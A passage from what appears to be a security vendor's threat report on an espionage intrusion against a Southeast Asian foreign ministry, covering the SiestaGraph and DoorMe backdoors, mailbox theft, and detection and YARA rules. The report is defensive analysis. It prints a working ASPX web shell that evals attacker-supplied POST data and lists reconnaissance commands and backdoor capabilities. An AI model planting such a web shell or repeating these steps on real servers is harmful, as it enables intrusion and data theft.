Once access was achieved and secured, the mailboxes of targeted individuals were exported.\n- Threat actors deployed a custom malware backdoor that leverages the Microsoft Graph API for command and control, which we’re naming SiestaGraph.\n- A modified version of an IIS backdoor called DoorMe was leveraged with new functionality to allocate shellcode and load additional implants.\n\n## Preamble\n\nIn early December, Elastic Security Labs observed Powershell commands used to collect and export mailboxes from an internet-connected Microsoft Exchange server for the Foreign Affairs Office of an Association of Southeast Asian Nations (ASEAN) member.\n\nIn spite of diverse security instrumentation observed during this activity, the threat actors were able to achieve:\n\n- The execution of malware on Exchange Servers, Domain Controllers, and workstations\n- Exfiltration of targeted user and group mailboxes\n- Deploy web shells\n- Move laterally to user workstations\n- Perform internal reconnaissance\n- Collect Windows credentials\n\nBecause the intrusion is ongoing and covers almost the entire MITRE ATT&CK framework, the analysis sections will use a timeline approach.\n\n> For a deep dive analysis of the SIESTAGRAPH, DOORME, or SHADOWPAD malware families, check out our [follow on publication](https://www.elastic.co/security-labs/update-to-the-REF2924-intrusion-set-and-related-campaigns) that covers those in detail. In addition, there are associations between this campaign and others based on other observations and 3rd party reporting.\n>\n> _Updated: 2/2/2023_\n\n## Analysis\n\nThe investigation, which we’re tracking as REF2924, began with the execution of a Powershell command used to export a user mailbox. While this is a normal administrative function, the commands were executed with a process ancestry starting with the IIS Worker Process ( **w3wp.exe** ) as a parent process of **cmd.exe** , and **cmd.exe** executing Powershell.\n\nThese events started the investigation that later identified multiple threat actors within the contested network environment.\n\nThe first events observed from this cluster of activity were on November 26, 2022, with the detection of a malicious file execution on a Domain Controller. Because of this, it is likely [Elastic Defend](https://docs.elastic.co/en/integrations/endpoint) was deployed post-initial compromise and was deployed in “Detect” mode. Throughout our analysis, we observed other security instrumentation tools in the environment indicating the victim was aware of the intrusion and trying to evict the threat actors.\n\nBecause of the multiple malware samples achieving similar goals, various DLL sideloading observations, and the presence of a likely internet-connected Exchange server; we believe that there are multiple threat actors or threat groups working independently or in tandem with each other.\n\n### November 26–30, 2022\n\n#### Malware execution\n\nThe earliest known evidence of compromise occurred on November 26, 2022, with the execution of a file called **OfficeClient.exe** executed from \\*\\*C:\\ProgramData\\Microsoft\\*\\* on a Domain Controller.\n\n10-minutes after **OfficeClient.exe** was executed on the Domain Controller, another malicious file was executed on another Windows 2019 server. This file was called **Officeclient.exe** and executed from **c:\\windows\\pla\\*\\*. On November 28, 2022, **officeup.exe** was executed on this same Windows 2019 server from **C:\\programdata\\*\\*.\n\nOn November 29, 2022, the **OfficeClient.exe** file was executed on an Exchange server as **C:\\ProgramData\\OfficeCore.exe**.\n\nAll three of these files ( **OfficeClient.exe** , **Officeclient.exe** , and **OfficeCore.exe** ) have an original PE file name of **windowss.exe** , which is the file name assigned at compile time. We are naming this malware family “SiestaGraph” because of the long sleep timer and the way that the malware uses the Microsoft Graph API for command and control.\n\nAs of December 8, 2022, we observed a variant of SiestaGraph in [VirusTotal](https://www.virustotal.com/gui/file/50c2f1bb99d742d8ae0ad7c049362b0e62d2d219b610dcf25ba50c303ccfef54), uploaded from the Netherlands on October 14, 2022. SiestaGraph makes use of a .NET API [library](https://github.com/KoenZomers/OneDriveAPI) that functions as an alternative to using Microsoft Graph, which is an API to interact with Microsoft cloud, including Microsoft 365, Windows, and Enterprise Mobility + Security.\n\n#### Internal reconnaissance\n\nOn November 28, 2022, the threat actor began performing internal reconnaissance by issuing standard commands such as **whoami** , **hostname** , **tasklist** , etc. These commands were executed with a process ancestry starting with the IIS Worker Process ( **w3wp.exe** ) as a parent process of **cmd.exe** , and **cmd.exe** executing the commands.\n\n```\ncmd.exe /c cd /d C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\resources\"&whoami\n\ncmd.exe /c cd /d C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\resources\"&hostname\n\ncmd.exe /c cd /d C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\Current\\themes\\resources\"&tasklist\n```\n\nAdditional adversary reconnaissance was performed to enumerate local network assets as well as victim assets at embassies and consulates abroad. There has been no indication that this information has been subsequently exploited for additional access or information at this time.\n\nOn November 29, 2022, the threat actor began collecting domain user and group information with the **net user** and **net group** commands, again issued as child processes of **w3wp.exe** and **cmd.exe**. These commands confirmed that this was not an entirely scripted campaign and included an active operator by the fact that they forgot to add the **/domain** syntax to two of the 20 **net user** commands. While the **net user** command does not require the **/domain** syntax, the fact that this was only on two of the 20 occurrences, it was likely an oversight by the operator. This was the first of multiple typographical errors observed throughout this campaign.\n\n![Example of a typographical error (“yupe” instead of “type”) showing an active operator](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image5.jpg)\n\n#### Exporting Exchange mailboxes\n\nOn November 28, 2022, the threat actor started to export user mailboxes, again using the **w3wp.exe** process as a parent for **cmd.exe** , and finally Powershell. The threat actor added the **Microsoft.Exchange.Management.PowerShell.SnapIn** module. This module provides the ability to manage Exchange functions using Powershell and was used to export the mailboxes of targeted Foreign Service Officers and saved them as PST files.\n\n![Abnormal process spawned from IIS Worker](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image11.jpg)\n\nIn the above example, the **Received -gt** and **Sent -gt** dates timebox the collection window as all emails sent and received after ( **gt** is an acronym for “greater than”) November 15, 2022. The timeboxing was not uniform across all mailboxes and this process was repeated multiple times. Again, in the above example from November 28, 2022, the timebox was for all sent and received emails from November 15, 2022, to the current date (November 28, 2022); on December 6, 2022, the mailbox was exported again, this time with a **gt** value of November 28, 2022, which was the date of the last export.\n\nIn another example in this phase, the threat actors targeted a mailbox called **csirt**. While this is unconfirmed, “csirt” is commonly an acronym for Cyber Security Incident Response Team.\n\n![CSIRT mailbox exported](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image6.jpg)\n\nTaking into consideration the timebox used on the **csirt** export, if this is the industry standard acronym of CSIRT, the intrusion could have started as early as September 1, 2022, and the threat actors were monitoring the CSIRT to identify if their intrusion had been detected.\n\nThroughout this phase, a total of 24 mailboxes were exported.\n\nOnce the mailboxes were exported, the threat actor created a 7zip archive called **7.tmp** with a password of **huebfkaudfbaksidfabsdf**.\n\n![Creating password-protected Zip archive](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image4.jpg)\n\nThree of the mailboxes, one of which being the **csirt** mailbox, were archived individually. These three mailboxes were archived with a **.log.rar** or **.log** file extension.\n\n![Targeted mailboxes archived individually (partially obfuscated as two PST files have user initials)](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image14.jpg)\n\nFinally, the threat actor created a 200m 7zip archive called **o.7z** and added the previously created, password-protected, **7.tmp** archive to it.\n\n![o.7z created from 7.tmp](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image13.jpg)\n\n#### IIS backdoor module\n\nOn November 28, 2022, we observed the loading of two DLL files, **Microsoft.Exchange.Entities.Content.dll** and **iisrehv.dll** through the execution of the **iissvcs** services using **svchost.exe**. Both **Microsoft.Exchange.Entities.Content.dll** and **iisrehv.dll** were loaded using the **iissvcs** module of the Windows Service Host through the execution of **C:\\Windows\\system32\\svchost.exe -k iissvcs**. These malicious IIS modules are loosely based on the [DoorMe](https://malpedia.caad.fkie.fraunhofer.de/details/win.doorme) IIS backdoor.\n\n![DoorMe strings embedded in IIS backdoor module](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image2.jpg)\n\n> For context, IIS is web server software developed by Microsoft and used within the Windows ecosystem to host websites and server-side applications. Starting on version 7.0, Microsoft extended IIS by adding a modular architecture that allows individual modules to be added or removed in order to achieve functionality depending on an environment’s needs. These modules represent individual features that the server can then use to process incoming requests.\n\nDuring the post-compromise stage, the adversary used the malicious IIS module as a passive backdoor monitoring all incoming HTTP requests. Depending on a tailor-made request by the operator, the malware will activate and process commands. This approach can be challenging for organizations as there is usually low visibility in terms of monitoring and a lack of prevention capabilities on these types of endpoints. In order to install this backdoor, it requires administrator rights and for the module to be placed inside the **%windir%\\System32\\inetsrv** directory, based on the observed artifacts we believe initial access was gained through server exploitation from a recent wave of Microsoft Exchange RCE exploit usage.\n\nThe malicious module (C++ DLL) is first loaded through its export, [RegisterModule](https://learn.microsoft.com/en-us/previous-versions/iis/smooth-streaming-client/pfn-registermodule-function). This function is responsible for setting up the event handler methods and dynamically resolving API libraries for future usage. The main functionality of the backdoor is implemented using the [CGlobalModule class](https://learn.microsoft.com/en-us/previous-versions/iis/smooth-streaming-client/cglobalmodule-class) under the event handler [OnGlobalPreBeginRequest](https://learn.microsoft.com/en-us/previous-versions/iis/smooth-streaming-client/cglobalmodule-onglobalprebeginrequest-method). By overriding this event handler, the malware is loaded before a request enters the pipeline. The core functionality of the backdoor all exists in this function, including cookie validation, parsing commands, and calling underlying command functions.\n\n![Class methods including malicious OnGlobalPreBeginRequest method](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image10.jpg)\n\nThe malware implements an authentication mechanism based on a specific cookie name that contains the authentication key. This malicious IIS module checks for every incoming HTTP request for the specified cookie name, and it returns a success message in case of a GET request. The GET request is used as a way to test the backdoor’s status for the operator, and it also returns back the username and hostname of the impacted machine. Commands can be passed to the backdoor through POST requests as data.\n\n![GET HTTP request with the authentication cookie](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image8.jpg)\n\nThroughout our analysis, we discovered old samples on VirusTotal relating to this backdoor. Although they have the same authentication and logic, they implement different functionalities. The cookie name used for authentication was also changed alongside the handled commands.\n\nThis observed backdoor implements four different commands, and the symbol PIPE is used to separate the command ID and its arguments.\n\n| ID   | Parameter                           | Description                                                                                                     |\n| ---- | ----------------------------------- | --------------------------------------------------------------------------------------------------------------- |\n| 0x42 | Expects the string GenBeaconOptions | Generates a unique Globally Unique Identifier used to identify the infected machine and send it to the attacker |\n| 0x43 | Shellcode blob                      | Execute the shellcode blob passed as a parameter in the current process                                         |\n| 0x44 | N/A                                 | Write and Read from a specified named pipe                                                                      |\n| 0x63 | Shellcode blob in chunks            | Similar to command ID: 0x43, this command can receive a blob of shellcode in chunks when fully received         |\n\nFrom our analysis, it appears that this simplistic backdoor is used as a stage loader. It uses NT Windows APIs, mainly **NtAllocateVirtualMemory** , **NtProtectVirtualMemory** , and **NtCreateThreadEx** , to allocate the required shellcode memory and to create the executing thread.\n\n#### kk2.exe\n\nOn November 30, 2022, an unknown binary called **kk2.exe** was executed on an Exchange server. While we have been unable to collect **kk2.exe** as of this writing, we can see that it was used to load a vulnerable driver that can be used to monitor and terminate processes from kernel mode, **mhyprot.sys**. It is unclear if **mhyprot.sys** is downloaded, or embedded into, **kk2.exe**.\n\n![kk2.exe loading the vulnerable mhyprot.sys driver](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image3.jpg)\n\n**mhyprot.sys** was detected by Elastic’s open code [Windows.VulnDriver.Mhyprot YARA rule](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_VulnDriver_Mhyprot.yar), released in August 2022.\n\n> For more information on how vulnerable drivers are used for intrusions, check out the [Stopping Vulnerable Driver Attacks](https://www.elastic.co/security-labs/stopping-vulnerable-driver-attacks) research Joe Desimone published in September 2022.\n\nAs stated previously, we could not collect **kk2.exe** for analysis but it is likely that it used **mhyprot.sys** to escalate to kernel mode as a way to monitor, and if necessary, terminate processes. This could be used as a way of protecting an implant, or entire intrusion, from detection.\n\n#### Web shells\n\nThe following section highlights multiple attempts by the threat actors to install a web shell as a back door into the environment if they are evicted. While speculative in nature, it appears that most of these attempts to load web shells failed. It is unclear what the reasons for the failures are. We’ll not cover every attempt at loading a web shell, as several of them were very similar, but we’ll highlight the shifts in approaches.\n\nThe first attempt was to use the Microsoft **certutil** tool to download an Active Server Pages (ASPX) file ( **config.aspx** ) from a remote host (**185.239.70[.]229**) and save it as the **error.aspx** page on the Exchange Control Panel’s webserver. Because this IP address is a [known](https://threatfox.abuse.ch/ioc/1023850/) Cobalt Strike server, it may have been blocked by network defense architecture, leading to further attempts to overwrite **error.aspx**.\n\n![Attempt to overwrite error.aspx with config.aspx from a known Cobalt Strike server](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image9.jpg)\n\nAfter attempting to use **config.aspx** from a Cobalt Strike C2 server, the threat actors attempted to insert Base64 encoded Javascript into a text file ( **1.txt** ), use **certutil** to decode the Base64 encoded Javascript ( **2.aspx** ), and then overwrite **error.aspx** with **2.aspx**. This was attempted on both the Exchange Control Panel and Outlook Web Access web servers.\n\n![Attempt to overwrite error.aspx with Javascript file](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image15.jpg)\n\nThe Base64 encoded string decoded into the following Javascript:\n\n```\n<%@ Page Language=\"Jscript\" Debug=true%>\n<%\nvar TNKY='nHsXLMPUSCABolxOgKWuIFeGVimhEjyzQrTvRcwafZdJDktqYpbN';\nvar ZZXG=Request.Form(\"daad\");\nvar VAXN=TNKY(7) + TNKY(0) + TNKY(2) + TNKY(10) + TNKY(21) + TNKY(22);\neval(ZZXG, VAXN);\n%\n```\n\nThe preceding code is a simple web shell leveraging the [eval Method](<https://learn.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2008/b51a45x6(v=vs.90)>)to evaluate JScript code sent through the POST parameter **daad**. Variations of this technique were attempted multiple times. Other attempts were observed to load [obfuscated versions](https://github.com/ysrc/webshell-sample/blob/master/aspx/54a5620d4ea42e41beac08d8b1240b642dd6fd7c.aspx#L11) of the [China Chopper](https://malpedia.caad.fkie.fraunhofer.de/details/win.chinachopper) and [Godzilla](https://malpedia.caad.fkie.fraunhofer.de/details/jsp.godzilla_webshell) [web shells](https://github.com/tennc/webshell/blob/master/Godzilla/123.ashx).\n\n### December 1–4, 2022\n\n### DLL side-loading\n\nOn December 2, 2022, on two Domain Controllers, we observed a new DLL ( **log.dll** ) being side loaded by a legitimate, but an 11-year-old, version of the Bitdefender Crash Handler executable (compiled name: **BDReinit.exe** ), **13802 AR.exe**. Once executed, it will move to the **C:\\ProgramData\\OfficeDriver\\*\\* directory, rename itself **svchost.exe\\*\\* , and install itself as a service.\n\nOnce **log.dll** is loaded, it will spawn the Microsoft Windows Media Player ( **wmplayer.exe** ) and **dllhost.exe** and injects into them which triggers a memory shellcode detection.\n\n_Updated 2/2/2023: In our_ [_updated research into SIESTAGRAPH, DOORME, and SHADOWPAD_](https://www.elastic.co/security-labs/update-to-the-REF2924-intrusion-set-and-related-campaigns)_, we identify_ _ **log.dll** _ _as part of the SHADOWPAD malware family._\n\nOn December 2, 2022, another unknown DLL, **Loader.any** , was interactively executed with an Administrative account using **rundll32.exe**. **Loader.any** was observed executing two times on a Domain Controller and was then deleted interactively.\n\nOn December 3, 2022, we observed another malicious file, **APerfectDayBase.dll**. While this is a known malicious file, the execution was not observed. **APerfectDayBase.dll** is the legitimate name of a DLL in the import table of a benign-looking program, **AlarmClock.exe**.\n\n![Import table for AlarmClock.exe](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image7.jpg)\n\nThis naming appears to be an attempt to make the malicious DLL look legitimate and likely to leverage **AlarmClock.exe** as a side-loading target. Testing has confirmed that the DLL can be side-loaded with **AlarmClock.exe**. While not malicious, we are including the hash for **AlarmClock.exe** in the Indicators table as its presence could be used purely as a side-loading vehicle for malicious DLL, **APerfectDayBase.dll**.\n\n## Victimology and targeting motivations\n\n### Diamond model\n\nElastic Security utilizes the [Diamond Model](https://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf) to describe high-level relationships between the adversaries, capabilities, infrastructure, and victims of intrusions. While the Diamond Model is most commonly used with single intrusions, and leveraging Activity Threading (section 8) as a way to create relationships between incidents, an adversary-centered (section 7.1.4) approach allows for a, although cluttered, single diamond.\n\n![REF2924 diamond model](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/ref2924_diamond.jpg)\n\n### Victimology\n\nThe victim is the foreign ministry of a nation in Southeast Asia. The threat actor appeared to focus priority intelligence collection efforts on personnel and positions of authority related to the victim's relationship with [ASEAN](https://asean.org/what-we-do) (Association of Southeast Asian Nations).\n\nASEAN is a regional partnership union founded in 1967 to promote intergovernmental cooperation among member states. This has been expressed through economic, security, trade, and educational cooperation with expanding international and domestic significance for partner nations. The union itself has expanded to 10 member countries with 2 more currently seeking accession. It is exerting this international influence over the development of a [Regional Comprehensive Economic Partnership](https://rcepsec.org/about/) trade agreement with a broader periphery of member nations (16 members and 2 applicants).\n\n![ASEAN and RCEP member countries](/assets/images/siestagraph-new-implant-uncovered-in-asean-member-foreign-ministry/image12.jpg)\n\nBelow is a list of the targeted users, the collection window(s) in which their mailboxes were exported, and the date their mailboxes were exported.\n\n| User    | Collection Window                             | Collection Date(s)  |\n| ------- | --------------------------------------------- | ------------------- |\n| User 1  | 11/1/2022 - 11/28/202211/29/2022 - 12/6/2022  | 11/28/202212/6/2022 |\n| User 2  | 11/1/2022 - 11/28/2022                        | 11/28/2022          |\n| User 3  | 11/1/2022 - 11/28/2022                        | 11/28/2022          |\n| User 4  | 11/15/2022 - 11/28/2022                       | 11/28/2022          |\n| User 5  | 11/15/2022 - 11/28/202211/29/2022 - 12/6/2022 | 11/28/202212/6/2022 |\n| User 6  | 11/15/2022 - 11/28/2022                       | 11/28/2022          |\n| User 7  | 11/15/2022 - 11/28/202211/29/2022 - 12/6/2022 | 11/28/202212/6/2022 |\n| User 8  | 11/15/2022 - 11/28/2022                       | 11/28/2022          |\n| User 9  | 11/15/2022 - 11/28/2022                       | 11/28/2022          |\n| User 10 | 9/15/2022 - 11/29/2022                        | 11/29/2022          |\n| User 11 | 9/15/2022 - 11/29/2022                        | 11/29/2022          |\n| User 12 | 9/15/2022 - 11/29/2022                        | 11/29/2022          |\n| User 13 | 9/1/2022 - 11/30/2022                         | 11/30/2022          |\n| User 14 | 9/1/2022 - 11/30/2022                         | 11/30/2022          |\n| User 15 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n| User 16 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n| User 17 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n| User 18 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n| User 19 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n| User 20 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n| User 21 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n| User 22 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n| User 23 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n| User 24 | 11/29/2022 - 12/6/2022                        | 12/6/2022           |\n\nAs reflected above, we observed Users 1, 5, and 7 targeted twice each indicating that the contents of their mailboxes were of particular interest. This could be the result of pre-intrusion reconnaissance or once the initial traunch of mailboxes was reviewed by the threat actor, they decided to continue collecting on those users.\n\n### Targeting motivation\n\nThere is no indication this victim would provide any direct monetary benefit to an adversary. The attack appears to be motivated by the purpose of diplomatic intelligence gathering. There are a number of potential adversaries who would find a nation’s confidential diplomatic communications related to ASEAN, and by extension the RCEP, to be highly advantageous in furthering their own regional influence, national security, and domestic goals.\n\nIf the threat actor is excluded from ASEAN trade unions and depends on foreign aid from members of those trade unions, it could find confidential diplomatic information specifically related to ASEAN useful for negotiating or renegotiating trade agreements.\n\nASEAN member nations are rival claimants to territorial disputes in the South China Sea (SCS). ASEAN as an organization has not produced a unified front in the SCS dispute, with some members preferring direct nation-to-nation negotiations and some wanting ASEAN to negotiate as a whole. Diplomatic information from ASEAN member nations might provide the threat actor with useful information to influence decisions and negotiations around the SCS. The threat actor's interest in ASEAN and any individual member would almost certainly be multifaceted covering government functions from immigration to agriculture, to technology, to sociopolitical considerations such as human rights.\n\n## Detection logic\n\n### Prevention rules\n\n- [Potential Masquerading as SVCHOST](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_potential_masquerading_as_svchost.toml)\n- [Binary Masquerading via Untrusted Path](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_binary_masquerading_via_untrusted_path.toml)\n- [Process Execution from an Unusual Directory](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_binary_masquerading_via_untrusted_path.toml)\n\n### Detection rules\n\n- [Potential Credential Access via DCSync](https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_dcsync_replication_rights.toml)\n- [Windows Service Installed via an Unusual Client](https://github.com/elastic/detection-rules/blob/main/rules/windows/privilege_escalation_windows_service_via_unusual_client.toml)\n- [Suspicious Microsoft IIS Worker Descendant](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/initial_access_suspicious_microsoft_iis_worker_descendant.toml)\n- [Encrypting Files with WinRar or 7z](https://github.com/elastic/detection-rules/blob/main/rules/windows/collection_winrar_encryption.toml)\n- [Exporting Exchange Mailbox via PowerShell](https://github.com/elastic/detection-rules/blob/main/rules/windows/collection_email_powershell_exchange_mailbox.toml)\n- [Windows Network Enumeration](https://github.com/elastic/detection-rules/blob/main/rules/windows/discovery_net_view.toml)\n- [NTDS or SAM Database File Copied](https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_copy_ntds_sam_volshadowcp_cmdline.toml)\n- [Suspicious CertUtil Commands](https://github.com/elastic/detection-rules/blob/main/rules/windows/defense_evasion_suspicious_certutil_commands.toml)\n\n### Hunting queries\n\nThe events for both KQL and EQL are provided with the Elastic Agent using the Elastic Defend integration. Hunting queries could return high signals or false positives. These queries are used to identify potentially suspicious behavior, but an investigation is required to validate the findings.\n\n#### KQL query\n\nUsing the Discover app in Kibana, the below query will identify loaded IIS modules that have been identified as malicious by Elastic Defend (even if Elastic Defend is in “Detect Only” mode).\n\nThe proceeding and preceding wildcards (\\*) can be an expensive search over a large number of events.\n\n```\nevent.code : “malicious_file” and event.action : \"load\" and process.name : “w3wp.exe” and process.command_line.wildcard : (*MSExchange* or *SharePoint*)\n```\n\n#### EQL queries\n\nUsing the Timeline section of the Security Solution in Kibana under the “Correlation” tab, you can use the below EQL queries to hunt for behaviors similar to the SiestaGraph backdoor and the observed DLL side-loading patterns.\n\n```\n# Hunt for DLL Sideloading using the observed DLLs:\n\nlibrary where\n dll.code_signature.exists == false and\n process.code_signature.trusted == true and\n dll.name : (\"log.dll\", \"APerfectDayBase.dll\") and\n process.executable :\n           (\"?:\\\\Windows\\\\Tasks\\\\*\",\n            \"?:\\\\Users\\\\*\",\n            \"?:\\\\ProgramData\\\\*\")\n\n# Hunt for scheduled task or service from a suspicious path:\n\nprocess where event.type == \"start\" and\n process.executable : (\"?:\\\\Windows\\\\Tasks\\\\*\", \"?:\\\\Users\\\\Public\\\\*\", \"?:\\\\ProgramData\\\\Microsoft\\\\*\") and\n (process.parent.args : \"Schedule\" or process.parent.name : \"services.exe\")\n\n# Hunt for the SiestaGraph compiled file name and running as a scheduled task:\n\nprocess where event.type == \"start\" and\n process.pe.original_file_name : \"windowss.exe\" and not process.name : \"windowss.exe\" and process.parent.args : \"Schedule\"\n\n# Hunt for unsigned executable using Microsoft Graph API:\n\nnetwork where event.action == \"lookup_result\" and\n dns.question.name : \"graph.microsoft.com\" and process.code_signature.exists == false\n```\n\n### YARA\n\nElastic Security has created YARA rules to identify this activity. Below are YARA rules to identify the [SiestaGraph malware implant](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_SiestaGraph.yar) and the [DoorMe IIS backdoor](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_DoorMe.yar).\n\n```\nrule Windows_Trojan_DoorMe {\n    meta:\n        author = \"Elastic Security\"\n        creation_date = \"2022-12-09\"\n        last_modified = \"2022-12-15\"\n        os = \"Windows\"\n        arch = \"x86\"\n        category_type = \"Trojan\"\n        family = \"DoorMe\"\n        threat_name = \"Windows.Trojan.DoorMe\"\n        reference_sample = \"96b226e1dcfb8ea2155c2fa508125472c8c767569d009a881ab4c39453e4fe7f\"\n    strings:\n        $seq_aes_crypto = { 8B 6C 24 ??
